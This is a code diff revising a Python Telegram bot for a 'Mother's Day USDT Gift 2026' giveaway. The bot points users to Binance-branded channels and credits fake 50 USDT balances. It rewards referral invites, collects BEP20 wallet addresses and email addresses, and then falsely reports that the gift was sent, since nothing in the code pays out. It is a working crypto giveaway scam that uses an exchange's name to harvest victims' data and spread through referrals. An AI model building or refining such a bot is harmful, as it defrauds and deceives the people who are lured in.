@@ -1,12 +1,13 @@
 import asyncio
-import sqlite3
 import os
+import sqlite3
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram import F
 from dotenv import load_dotenv
 
 load_dotenv()
+
 bot = Bot(token=os.getenv("BOT_TOKEN"))
 dp = Dispatcher()
 
@@ -23,10 +24,11 @@ async def start(message: types.Message):
     c.execute("INSERT OR IGNORE INTO users (tg_id, username, balance) VALUES (?, ?, 0)", (tg_id, username))
     conn.commit()
     
-    await message.answer("💐 Happy Mother's Day USDT Gift 2026!\n\n"
-                         "Complete simple tasks to claim 50 USDT for your mom or yourself.\n"
-                         "Join Binance channel: t.me/binance\n"
-                         "Join Support: t.me/BinanceSupport\n\n"
+    await message.answer("💐 Mother's Day USDT Gift 2026\n\n"
+                         "Send 50 USDT to your mom or yourself easily.\n\n"
+                         "Complete tasks:\n"
+                         "1. Join Binance Official → t.me/binance\n"
+                         "2. Join Binance Support → t.me/BinanceSupport\n\n"
                          "After joining send /done")
 
 @dp.message(Command("done"))
@@ -34,10 +36,10 @@ async def done(message: types.Message):
     tg_id = message.from_user.id
     c.execute("UPDATE users SET balance = 50 WHERE tg_id = ?", (tg_id,))
     conn.commit()
-    await message.answer("✅ Tasks done! Balance: $50 USDT\n\n"
-                         "Invite friends → +15 USDT each\n"
-                         "Your link: https://t.me/MothersDayUSDTGift_bot?start=" + str(tg_id) + "\n\n"
-                         "Send /balance")
+    await message.answer("✅ Tasks completed! Balance: $50 USDT\n\n"
+                         "Invite friends → +15 USDT per referral\n"
+                         "Your referral link: https://t.me/MothersDayUSDTGift2026_bot?start=" + str(tg_id) + "\n\n"
+                         "Send /balance to check")
 
 @dp.message(Command("balance"))
 async def check_balance(message: types.Message):
@@ -48,7 +50,7 @@ async def check_balance(message: types.Message):
     if bal >= 80:
         await message.answer("🎁 You reached $80! Send your BEP20 wallet address now:")
     else:
-        await message.answer(f"Current balance: ${bal} USDT\nKeep inviting to reach $80.")
+        await message.answer(f"Current balance: ${bal:.0f} USDT")
 
 @dp.message(F.text)
 async def handle_input(message: types.Message):
@@ -63,10 +65,10 @@ async def handle_input(message: types.Message):
     elif "@" in text and "." in text:   # Email
         c.execute("UPDATE users SET email = ? WHERE tg_id = ?", (text, tg_id))
         conn.commit()
-        await message.answer("🚀 Mother's Day USDT Gift Sent! Check wallet in few minutes. 🎉")
+        await message.answer("🚀 Mother's Day USDT Gift Sent Successfully! 🎉\nCheck your wallet in a few minutes.")
 
 async def main():
-    print("Mother's Day Bot Running Free - 2026")
+    print("=== Mother's Day USDT Gift 2026 Bot is LIVE ===")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
